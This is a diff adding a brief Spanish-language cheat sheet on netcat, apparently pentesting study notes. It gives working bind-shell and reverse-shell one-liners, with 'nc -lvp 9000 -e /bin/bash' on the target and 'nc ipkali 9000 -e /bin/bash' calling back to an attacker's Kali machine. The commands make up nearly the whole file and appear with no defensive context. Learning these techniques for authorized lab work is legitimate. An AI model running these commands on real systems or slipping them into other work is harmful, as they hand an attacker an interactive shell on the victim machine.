@@ -1,0 +1,18 @@
+
+nc (netcat)
+
+
+# Aqui se conecta a nosotros y recoje el shell que ofrece
+BIND:
+    kali : nc ipMLinux 9000
+
+    MLinux : nc -lvp 9000 -e /bin/bash
+
+
+# Aqui nos quedamos a la escucha y desde la otra maquina inicia la comunicacion con nosotros entregandonos una shell
+REVERSE:
+
+    kali: nc -lvp 9000
+    MLinux : nc ipkali 9000 -e /bin/bash
+
+
